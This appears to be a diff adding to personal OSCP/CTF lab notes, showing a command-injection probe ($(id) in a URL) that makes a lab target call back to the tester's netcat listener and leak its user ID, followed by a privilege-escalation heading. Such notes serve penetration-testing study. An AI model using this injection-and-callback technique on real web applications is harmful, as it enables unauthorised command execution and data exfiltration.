@@ -2,6 +2,21 @@
 
 # OSCP / CTF
 
+TRy to insert VAR into webapp
+
+```
+http://myip:8081/$(id)
+
+└─$ nc -lvnp 8081                                                                                130 ⨯
+listening on [any] 8081 ...
+connect to [10.10.15.77] from (UNKNOWN) [10.10.10.209] 39242
+GET /uid=1001(web) HTTP/1.1
+Host: 10.10.15.77:8081
+User-Agent: curl/7.68.0
+Accept: */*
+```
+
+
 LPE
 ```
 waldo@admirer:~$ id && hostname
